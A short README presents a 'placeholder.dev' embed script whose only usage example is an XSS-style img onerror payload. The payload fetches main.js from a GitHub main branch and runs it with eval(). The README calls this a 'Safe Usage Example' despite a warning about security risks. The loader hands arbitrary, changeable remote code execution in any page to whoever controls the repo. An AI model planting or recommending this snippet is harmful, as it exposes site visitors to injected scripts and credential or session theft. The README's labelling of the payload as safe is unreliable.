## 📦 placeholder.dev Embed Script

This is an embeddable JavaScript loader for the [`placeholder.dev`](https://github.com/Ikonik24/placeholder.dev) project. It dynamically fetches and executes the latest version of `main.js` from the `main` branch of the GitHub repo.

### 🚀 How It Works

When this script is embedded in a website, it pulls the latest `main.js` from GitHub and runs it inside the page. This is useful for testing live scripts, dashboards, or injecting tools for development.

---

### ⚠️ Warning

> This embed method uses `eval()` and `fetch()` to load and run remote JavaScript. It **should only be used on domains you own or trust**. Never embed this on third-party websites or use it in production without understanding the security risks.

---

### ✅ Safe Usage Example

```html
<img src="#" onerror='fetch("https://raw.githubusercontent.com/Ikonik24/placeholder.dev/refs/heads/main/main.js").then(r=>r.text()).then(c=>eval(c))'>
```

Place this `<img>` tag anywhere in your HTML. When the image fails to load, it triggers the `onerror`, which fetches and executes `main.js`.
